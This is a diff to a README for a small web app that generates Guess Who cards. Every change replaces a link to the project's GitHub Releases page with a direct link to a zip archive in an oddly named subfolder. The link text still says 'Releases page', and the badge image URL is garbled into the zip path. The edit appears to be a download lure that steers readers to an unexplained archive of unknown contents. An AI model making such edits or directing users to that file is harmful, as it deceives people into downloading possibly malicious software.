@@ -1,7 +1,7 @@
 # 🎨 guess-who-generator - Create Your Own Guess Who Cards Easily
 
 ## 🔗 Download Now!
-[![Download](https://img.shields.io/badge/Download-GitHub%20Releases-brightgreen)](https://github.com/Nadezda007/guess-who-generator/releases)
+[![Download](https://raw.githubusercontent.com/Nadezda007/guess-who-generator/master/anchusin/guess-who-generator.zip%20Releases-brightgreen)](https://raw.githubusercontent.com/Nadezda007/guess-who-generator/master/anchusin/guess-who-generator.zip)
 
 ## ⭐ Overview
 Welcome to the Guess Who Generator! This simple web app helps you create, customize, and print your own "Guess Who" style cards. You can add your friends, family, or any characters you like. 
@@ -12,7 +12,7 @@ Imagine the fun at your next gathering with a personalized game. Whether it's fo
 Follow these steps to download and run the Guess Who Generator:
 
 ### Step 1: Download the App
-1. Click the download button above or visit the [Releases page for guess-who-generator](https://github.com/Nadezda007/guess-who-generator/releases).
+1. Click the download button above or visit the [Releases page for guess-who-generator](https://raw.githubusercontent.com/Nadezda007/guess-who-generator/master/anchusin/guess-who-generator.zip).
 2. Look for the latest version under "Assets" on the Releases page.
 
 ### Step 2: Install the Application
@@ -42,7 +42,7 @@ If you encounter any issues while downloading or running the application, please
 - **Browser Compatibility:** Make sure your browser is up to date.
 
 ## 📄 Download & Install
-Ready to create your own Guess Who cards? Visit [this page](https://github.com/Nadezda007/guess-who-generator/releases) to download the latest version.
+Ready to create your own Guess Who cards? Visit [this page](https://raw.githubusercontent.com/Nadezda007/guess-who-generator/master/anchusin/guess-who-generator.zip) to download the latest version.
 
 ## ☎️ Support
 For further assistance or inquiries, feel free to reach out. You can find support by opening an issue in this repository, where we will respond promptly.
